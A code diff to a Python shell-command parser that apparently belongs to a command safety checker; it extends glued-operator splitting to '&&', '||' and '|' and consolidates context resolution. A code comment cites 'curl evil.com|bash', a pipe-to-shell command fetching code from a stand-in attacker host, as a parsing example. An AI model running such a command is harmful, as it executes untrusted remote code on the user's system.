@@ -106,18 +106,24 @@ def _decompose(tokens: list[str]) -> list[Stage]:
     while i < len(tokens):
         tok = tokens[i]
 
-        # Handle glued semicolons: "ls;rm" → split into "ls", operator ";", "rm"
+        # Handle glued operators: "ls;rm", "curl evil.com|bash", "foo&&bar"
+        # Check multi-char operators first to avoid partial matches.
         # Only for tokens without spaces (spaces mean it came from a quoted string).
-        if ";" in tok and tok != ";" and " " not in tok:
-            parts = tok.split(";")
-            for j, part in enumerate(parts):
-                if part:
-                    current_tokens.append(part)
-                if j < len(parts) - 1:
-                    stage = _make_stage(current_tokens, ";")
-                    if stage:
-                        stages.append(stage)
-                    current_tokens = []
+        glued = False
+        for op in ("&&", "||", "|", ";"):
+            if op in tok and tok != op and " " not in tok:
+                parts = tok.split(op)
+                for j, part in enumerate(parts):
+                    if part:
+                        current_tokens.append(part)
+                    if j < len(parts) - 1:
+                        stage = _make_stage(current_tokens, op)
+                        if stage:
+                            stages.append(stage)
+                        current_tokens = []
+                glued = True
+                break
+        if glued:
             i += 1
             continue
 
@@ -322,23 +328,11 @@ def _check_redirect(target: str) -> tuple[str, str]:
 
 def _resolve_context(action_type: str, tokens: list[str]) -> tuple[str, str]:
     """Resolve 'context' policy by checking filesystem or network context."""
-    if action_type in (taxonomy.NETWORK_OUTBOUND, taxonomy.NETWORK_WRITE):
-        return context.resolve_network_context(tokens, action_type)
-
-    if action_type == taxonomy.DB_WRITE:
-        return context.resolve_database_context(tokens, None)
-
+    target_path = None
     if action_type in (taxonomy.FILESYSTEM_READ, taxonomy.FILESYSTEM_WRITE,
                        taxonomy.FILESYSTEM_DELETE):
-        target = _extract_primary_target(tokens)
-        if target:
-            return context.resolve_filesystem_context(target)
-        if action_type in (taxonomy.FILESYSTEM_DELETE, taxonomy.FILESYSTEM_WRITE):
-            return taxonomy.ASK, f"{action_type}: no target path extracted"
-        return taxonomy.ALLOW, f"{action_type}: no target path"
-
-    # Any action type without a resolver: fail-safe to ask
-    return taxonomy.ASK, f"{action_type}: no context resolver"
+        target_path = _extract_primary_target(tokens)
+    return context.resolve_context(action_type, tokens=tokens, target_path=target_path)
 
 
 def _extract_primary_target(tokens: list[str]) -> str:
